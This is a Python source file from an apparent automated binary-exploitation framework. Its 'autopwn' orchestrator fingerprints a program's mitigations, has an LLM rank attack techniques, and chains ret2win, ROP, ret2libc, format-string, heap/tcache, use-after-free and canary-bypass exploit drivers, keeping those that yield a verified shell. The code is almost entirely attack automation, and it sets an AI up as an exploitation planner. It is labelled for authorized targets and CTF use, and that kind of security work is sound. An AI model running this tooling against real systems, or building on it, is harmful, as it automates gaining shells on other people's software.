"""Autonomous exploitation orchestrator.

Given a binary, it tries a sequence of attack combinations end to end, verifying which
actually work, and feeds everything it learns (mitigations, sinks, gadgets, offsets,
successful chains) back into the knowledge base so future runs improve. For AUTHORIZED
targets / CTF only."""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple

from ..oracles import build_registry
from .triage import run_triage
from .vulnhunt import run_hunt
from .verify import auto_verify
from .autopoc import autopoc, find_win
from .rop import build_rop_chain


@dataclass
class AutopwnResult:
    binary: str
    log: List[str] = field(default_factory=list)
    attempts: List[Tuple[str, Optional[bool], str]] = field(default_factory=list)  # (name, ok, detail)
    verified_findings: int = 0
    win_exploit: bool = False
    ai_plan: str = ""
    ai_conclusion: str = ""
    # contexto del binario (defensas/primitivas), para que el informe refleje POR QUE cada tecnica
    arch: str = ""
    bits: str = ""
    mit: dict = field(default_factory=dict)      # nx/pic/canary/relro, tal cual los da checksec
    sinks: List[str] = field(default_factory=list)
    has_win: bool = False


def autopwn(binary: str, config=None, store=None,
            on_step: Optional[Callable[[str], None]] = None, run: bool = True, llm=None,
            techniques: Optional[List[str]] = None) -> AutopwnResult:
    reg = build_registry(binary)
    res = AutopwnResult(binary=binary)

    def log(m: str):
        res.log.append(m)
        if on_step:
            on_step(m)

    def learn(fact: str):
        if store:
            store.add_knowledge("autopwn", fact)

    def want(t: str) -> bool:
        return (not techniques) or (t in techniques)

    # 1) recon facts -> feed the KB
    cs = reg.get("r2_checksec").run()
    mit = cs.meta if cs.ok else {}
    arch = mit.get("arch", "?"); bits = mit.get("bits", "?")
    log(f"[recon] arch={arch} {bits}-bit  NX={mit.get('nx')}  PIE={mit.get('pic')}  canary={mit.get('canary')}")
    learn(f"recon {arch}/{bits}: NX={mit.get('nx')} PIE={mit.get('pic')} canary={mit.get('canary')}")

    sinks = reg.get("r2_sinks").run()
    sink_names = sinks.meta.get("sinks", []) if sinks.ok else []
    log(f"[recon] sinks: {', '.join(sink_names) or 'ninguno'}")
    learn(f"sinks: {sink_names}")

    # guarda el contexto estructurado para el informe (no solo en la traza)
    res.arch, res.bits, res.mit, res.sinks = str(arch), str(bits), dict(mit), list(sink_names)
    res.has_win = find_win(binary) is not None

    gad = reg.get("r2_rop").run(filter="pop rdi") if reg.get("r2_rop") else None
    has_pop_rdi = bool(gad and gad.ok and gad.meta.get("count", 0) > 0)
    log(f"[recon] gadget 'pop rdi': {'si' if has_pop_rdi else 'no'}")
    if has_pop_rdi:
        learn("gadget pop rdi disponible")

    # 1b) let the AI decide what to try, based on what it sees (facts above)
    ai_order = None
    if llm is not None and getattr(llm, "available", lambda: False)():
        facts = (f"arch={arch} {bits}-bit; NX={mit.get('nx')}; PIE={mit.get('pic')}; "
                 f"canary={mit.get('canary')}; sinks={sink_names}; pop_rdi={has_pop_rdi}; "
                 f"win_function={'si' if find_win(binary) else 'no'}")
        prior = ""
        if store:
            prior = "\n".join("- " + k["content"] for k in store.get_knowledge(limit=8))
        ai_order, reasoning = _ai_plan(llm, facts, prior)
        res.ai_plan = reasoning
        if reasoning:
            log("[ia] plan: " + reasoning.replace("\n", " ")[:300])
        if store and reasoning:
            learn("plan IA: " + reasoning[:400])

    # 2) hunt + deterministic verification -> feed verified facts
    hunt = run_hunt(reg, binary, llm=None, config=config, store=store)
    findings, _ = auto_verify(reg, hunt.findings, store=store)
    res.verified_findings = sum(1 for f in findings if f.verdict == "verified")
    log(f"[verify] hallazgos verificados por angr: {res.verified_findings}")
    if store:
        store.save_verified_facts(findings, arch, bits, cs.data if cs.ok else "")

    # 3) try combinations
    win = find_win(binary)

    # combo A: ret2win (build + sandbox verify)
    is_pie = str(mit.get("pic", "")).lower() in ("true", "1")
    canary_on = str(mit.get("canary", "")).lower() in ("true", "1")
    # Un canary detiene el overflow lineal ANTES del `ret`, asi que el ret2win directo no puede
    # funcionar: seria un intento de sandbox fallido garantizado. Con canary + win() la ruta
    # correcta es el bypass por fuga (combo G, autocanary), no el ret2win directo.
    if want("ret2win") and win is not None and not canary_on:
        log("[combo] ret2win: construyendo y verificando en sandbox..." + (" (PIE)" if is_pie else ""))
        try:
            if is_pie:
                from .autopie import autopie_ret2win
                rp = autopie_ret2win(binary, run=run)
                verdict = True if rp.get("verified") else (None if rp.get("ok") else False)
                res.attempts.append(("ret2win", verdict, rp.get("detail") or rp.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rp.get("verified"))
                log(f"[combo] ret2win (PIE) -> {'FUNCIONA (verificado)' if rp.get('verified') else 'no verificado'}")
                learn(f"ret2win-pie verified={rp.get('verified')} {rp.get('detail','')}")
            else:
                r = autopoc(binary, run=run)
                res.attempts.append(("ret2win", r.verified, f"offset={r.offset} win={hex(win)}"))
                res.win_exploit = res.win_exploit or r.verified
                log(f"[combo] ret2win -> {'FUNCIONA (verificado)' if r.verified else ('construido, no verificado' if r.ok else 'no aplicable')}")
                learn(f"ret2win verified={r.verified} offset={r.offset} win={hex(win)}")
        except Exception as e:
            res.attempts.append(("ret2win", False, str(e)))
            log(f"[combo] ret2win error: {e}")
    elif want("ret2win") and win is not None and canary_on:
        log("[combo] ret2win: canary activo -> el overflow lineal se omite, se usa el bypass por fuga (combo canary)")
    elif want("ret2win"):
        log("[combo] ret2win: no hay funcion gift -> se omite")

    # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
    # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
    # + SROP). Both verify by getting a real shell in the sandbox.
    if want("rop-chain"):
      log("[combo] cadena ROP: intentando construir..." + (" (PIE)" if is_pie else ""))
      try:
        if is_pie:
            from .autopie import autopie_rop
            rr = autopie_rop(binary, run=run)
        else:
            from .autopoc import autorop
            rr = autorop(binary, run=run)
        verdict = True if rr.get("verified") else (None if rr.get("ok") else False)
        detail = (rr.get("strategy", "") + (" -> SHELL verificada" if rr.get("verified") else
                  " (construida)" if rr.get("ok") else "")) or rr.get("detail") or rr.get("note", "")
        res.attempts.append(("rop-chain", verdict, detail or rr.get("note", "")))
        res.win_exploit = res.win_exploit or bool(rr.get("verified"))
        log(f"[combo] cadena ROP -> {'SHELL VERIFICADA' if rr.get('verified') else ('construida' if rr.get('ok') else 'no automatica')}")
        learn(f"rop verified={rr.get('verified')} strategy={rr.get('strategy') or rr.get('detail')}")
      except Exception as e:
        res.attempts.append(("rop-chain", False, str(e)))

    # combo B2: ret2libc with leak (dynamic binaries), verified by getting a shell
    if want("ret2libc"):
        log("[combo] ret2libc con leak (fuga libc -> system, sandbox)...")
        try:
            from .autolibc import autolibc
            rl = autolibc(binary)
            verdict = True if rl.get("verified") else (None if rl.get("ok") else False)
            res.attempts.append(("ret2libc", verdict, rl.get("detail") or rl.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rl.get("verified"))
            log(f"[combo] ret2libc -> {'SHELL VERIFICADA' if rl.get('verified') else 'no aplicable/verificable'}")
            learn(f"ret2libc verified={rl.get('verified')} {rl.get('detail','')}")
        except Exception as e:
            res.attempts.append(("ret2libc", False, str(e)))

    # combo C: stack shellcode if NX is off
    if want("shellcode-stack") and str(mit.get("nx", "")).lower() in ("false", "0", "nx_off"):
        res.attempts.append(("shellcode-stack", True, "NX desactivado -> shellcode en stack viable"))
        log("[combo] NX off -> shellcode en stack viable")
        learn("shellcode-stack viable (NX off)")

    # combo D: format-string (verified by GOT overwrite -> shell)
    if want("format-string") and any(s in sink_names for s in ("printf", "fprintf", "snprintf")):
        log("[combo] format-string: intentando GOT overwrite -> shell (sandbox)...")
        try:
            from .autofmt import autofmt
            rf = autofmt(binary)
            verdict = True if rf.get("verified") else (None if rf.get("ok") else False)
            res.attempts.append(("format-string", verdict, rf.get("detail") or rf.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rf.get("verified"))
            log(f"[combo] format-string -> {'SHELL VERIFICADA' if rf.get('verified') else 'no verificable (requiere printf en bucle)'}")
            learn(f"format-string verified={rf.get('verified')} {rf.get('detail','')}")
        except Exception as e:
            res.attempts.append(("format-string", False, str(e)))

    if ai_order:
        rank = {t: i for i, t in enumerate(ai_order)}
        res.attempts.sort(key=lambda a: rank.get(a[0], 99))
        log("[ia] orden priorizado por la IA: " + ", ".join(ai_order))

    # 4) AI conclusion on what worked
    if llm is not None and getattr(llm, "available", lambda: False)():
        res.ai_conclusion = _ai_conclude(llm, res)
        if res.ai_conclusion:
            log("[ia] conclusion generada")
            learn("conclusion IA: " + res.ai_conclusion[:400])

    # combo E: heap corruption confirmed dynamically
    heap_tool = reg.get("r2_heap")
    has_heap = False
    if heap_tool:
        _hr = heap_tool.run()
        has_heap = _hr.ok and _hr.meta.get("heap", False)
    if want("heap") and has_heap:
        log("[combo] heap: confirmando corrupcion (double-free/overflow) en sandbox...")
        try:
            from .autoheap import autoheap
            rh = autoheap(binary)
            if rh.get("confirmed"):
                kinds = ", ".join(sorted({h["kind"] for h in rh.get("hits", [])}))
                res.attempts.append(("heap-corruption", True, f"confirmada ({kinds})"))
                log(f"[combo] heap -> CORRUPCION CONFIRMADA ({kinds})")
                learn(f"heap-corruption confirmed kinds={kinds}")
            else:
                res.attempts.append(("heap-corruption", None, rh.get("note", "")))
                log("[combo] heap -> no disparada con entradas de prueba")
        except Exception as e:
            res.attempts.append(("heap-corruption", False, str(e)))

    # combo F: heap-to-shell families (menu-driven). Cheap ELF-symbol applicability pre-checks
    # avoid wasted sandbox runs; each driver verifies by getting a REAL shell (not just a crash).
    if run:
        try:
            from .autoheap import autoheap_shell, _heap_shell_applicable
            from .autouaf import autouaf_shell, _uaf_applicable
            from .autotcachedup import autotcachedup_shell, _tcache_dup_applicable
            from .autowow import autowow_shell, _wow_applicable
            heap_combos = []
            if want("heap-shell") and _heap_shell_applicable(binary):
                heap_combos.append(("heap-shell", autoheap_shell, "tcache poison -> free@GOT=win"))
            if want("uaf-funcptr") and _uaf_applicable(binary):
                heap_combos.append(("uaf-funcptr", autouaf_shell, "UAF reuso de chunk -> funcptr=win"))
            if want("tcache-dup") and _tcache_dup_applicable(binary):
                heap_combos.append(("tcache-dup", autotcachedup_shell, "tcache dup -> GOT=system"))
            if want("write-what-where") and _wow_applicable(binary):
                heap_combos.append(("write-what-where", autowow_shell, "indice sin comprobar -> GOT=win"))
        except Exception as e:
            heap_combos = []
            log(f"[combo] heap-shell families no disponibles: {e}")
        for name, fn, desc in heap_combos:
            log(f"[combo] {name}: {desc} (sandbox)...")
            try:
                rx = fn(binary)
                verdict = True if rx.get("verified") else (None if rx.get("ok") else False)
                res.attempts.append((name, verdict, rx.get("detail") or rx.get("note", "")))
                res.win_exploit = res.win_exploit or bool(rx.get("verified"))
                log(f"[combo] {name} -> {'SHELL VERIFICADA' if rx.get('verified') else 'no verificado'}")
                learn(f"{name} verified={rx.get('verified')} {rx.get('detail','')}")
            except Exception as e:
                res.attempts.append((name, False, str(e)))

    # combo G: stack-canary bypass by leak (canary present + a gift win()). autocanary leaks the
    # canary via a %s echo, then overflows past it to win().
    if run and want("canary") and canary_on and win is not None:
        log("[combo] canary: fuga del canary + overflow a win (sandbox)...")
        try:
            from .autocanary import autocanary
            rc = autocanary(binary)
            verdict = True if rc.get("verified") else (None if rc.get("ok") else False)
            res.attempts.append(("canary-bypass", verdict, rc.get("detail") or rc.get("note", "")))
            res.win_exploit = res.win_exploit or bool(rc.get("verified"))
            log(f"[combo] canary -> {'SHELL VERIFICADA' if rc.get('verified') else 'no verificado'}")
            learn(f"canary-bypass verified={rc.get('verified')} {rc.get('detail','')}")
        except Exception as e:
            res.attempts.append(("canary-bypass", False, str(e)))

    log("[fin] combinaciones probadas: " + ", ".join(a[0] for a in res.attempts))
    return res


def _ai_plan(llm, facts: str, prior: str):
    from ..llm.base import Message
    sys = ("Eres un analista de explotacion. Segun los hechos del binario, decide QUE tecnicas "
           "probar y en QUE ORDEN, eligiendo solo de esta lista: ret2win, rop-chain, "
           "shellcode-stack, format-string. Responde en 2-3 frases el razonamiento y termina con "
           "una linea 'ORDEN: t1, t2, ...' con las tecnicas priorizadas. Usa solo la evidencia dada.")
    user = f"Hechos:\n{facts}" + (f"\n\nConocimiento previo:\n{prior}" if prior else "")
    try:
        txt = llm.chat([Message("system", sys), Message("user", user)])
    except Exception:
        return None, ""
    order = None
    for line in txt.splitlines():
        if "ORDEN" in line.upper():
            import re as _re
            toks = _re.findall(r"ret2win|rop-chain|shellcode-stack|format-string", line.lower())
            if toks:
                order = list(dict.fromkeys(toks))
    return order, txt.strip()


def _ai_conclude(llm, res) -> str:
    from ..llm.base import Message
    table = "\n".join(f"- {n}: {('funciona' if ok is True else ('no' if ok is False else 'posible'))} ({d})"
                       for n, ok, d in res.attempts)
    sys = ("Eres un analista de explotacion. Resume en 2-4 frases que combinacion funciono, por que, "
           "y cual seria el siguiente paso concreto. Usa solo los resultados dados, no inventes.")
    user = f"Binario: {res.binary}\nResultados:\n{table}\nExploit ret2win verificado: {res.win_exploit}"
    try:
        return llm.chat([Message("system", sys), Message("user", user)]).strip()
    except Exception:
        return ""


def _flag(v) -> bool:
    return str(v).lower() in ("true", "1")


def _why(mit: dict, has_win: bool, technique: str) -> str:
    """Razon 'defensa -> tecnica': por que ESTA tecnica es la adecuada para este contexto."""
    t = (technique or "").lower()
    pie = _flag(mit.get("pic")); can = _flag(mit.get("canary"))
    if "canary" in t:
        return "canary ACTIVO + win() + buffer impreso -> fuga del canary, reescritura y overflow a win()"
    if "ret2win" in t:
        return ("win() presente" + (" con PIE -> se resuelve la base en sandbox" if pie
                else " sin canary -> retorno directo a win() (direccion fija)"))
    if "ret2libc" in t:
        return "sin win(): fuga de libc (puts@GOT) -> base -> system('/bin/sh')"
    if "rop" in t:
        return ("sin win()/system directo -> cadena ROP execve por syscall"
                + (" (PIE: base resuelta en sandbox)" if pie else ""))
    if "format" in t:
        return "printf(entrada) controlado -> escritura via %n (GOT o retorno segun RELRO)"
    if "heap" in t or "tcache" in t or "uaf" in t:
        return "primitiva de heap (UAF/tcache) -> secuestro de puntero/GOT a win()/system"
    if "wow" in t or "write" in t:
        return "escritura arbitraria (indice sin check) -> GOT de funcion llamada despues = win()"
    return "seleccionada segun las defensas y primitivas observadas"


def render_autopwn(res: AutopwnResult, lang: str = "es") -> str:
    out = [f"## Auto-explotacion de `{res.binary}`\n"]
    if res.win_exploit:
        techs = [n for n, ok, _ in res.attempts if ok is True]
        out.append("> EXPLOIT VERIFICADO: se ejecuto un exploit (" + ", ".join(techs) +
                   ") en sandbox y se consiguio el objetivo.\n")
    # Contexto (defensas/primitivas): refleja POR QUE se eligio cada tecnica, no solo el resultado
    if res.mit or res.arch:
        m = res.mit or {}
        defs = []
        defs.append("NX " + ("ON" if _flag(m.get("nx")) else "off"))
        defs.append("PIE " + ("ON" if _flag(m.get("pic")) else "off"))
        defs.append("canary " + ("ON" if _flag(m.get("canary")) else "off"))
        if m.get("relro"):
            defs.append("RELRO " + str(m.get("relro")))
        out.append("### Contexto del binario (defensas detectadas)\n")
        out.append(f"- arquitectura: **{res.arch or '?'} {res.bits or '?'}-bit**")
        out.append(f"- mitigaciones: **{' · '.join(defs)}**")
        out.append(f"- funcion gift `win()`: **{'si' if res.has_win else 'no'}**")
        out.append(f"- sinks peligrosos: {', '.join(res.sinks) if res.sinks else 'ninguno'}")
        if res.win_exploit:
            techs = [n for n, ok, _ in res.attempts if ok is True]
            out.append("- **por que la tecnica elegida**: " + _why(res.mit, res.has_win, techs[0] if techs else ""))
        out.append("")
    out.append(f"- hallazgos verificados: {res.verified_findings}")
    if res.ai_plan:
        out.append("\n### Plan de la IA (que probar segun lo observado)\n" + res.ai_plan)
    out.append("\n### Combinaciones probadas\n")
    out.append("| tecnica | resultado | detalle |")
    out.append("|---|---|---|")
    for name, ok, detail in res.attempts:
        r = "FUNCIONA" if ok is True else ("no" if ok is False else "posible")
        out.append(f"| {name} | {r} | {detail} |")
    if res.ai_conclusion:
        out.append("\n### Conclusion de la IA\n" + res.ai_conclusion)
    out.append("\n### Traza\n```\n" + "\n".join(res.log) + "\n```")
    out.append("\nTodo lo descubierto se ha guardado en la base de conocimiento (retroalimentacion).")
    return "\n".join(out)


def autopwn_to_json(res: "AutopwnResult") -> str:
    import json
    techs = [n for n, ok, _ in res.attempts if ok is True]
    return json.dumps({
        "binary": res.binary,
        "context": {"arch": res.arch, "bits": res.bits, "mitigations": res.mit,
                    "sinks": res.sinks, "has_win": res.has_win},
        "verified_findings": res.verified_findings,
        "exploit_verified": res.win_exploit,
        "rationale": (_why(res.mit, res.has_win, techs[0]) if (res.win_exploit and techs) else ""),
        "attempts": [{"technique": n, "result": ("works" if ok is True else
                     ("no" if ok is False else "possible")), "detail": d}
                     for n, ok, d in res.attempts],
        "ai_plan": res.ai_plan, "ai_conclusion": res.ai_conclusion,
        "log": res.log,
    }, indent=2)
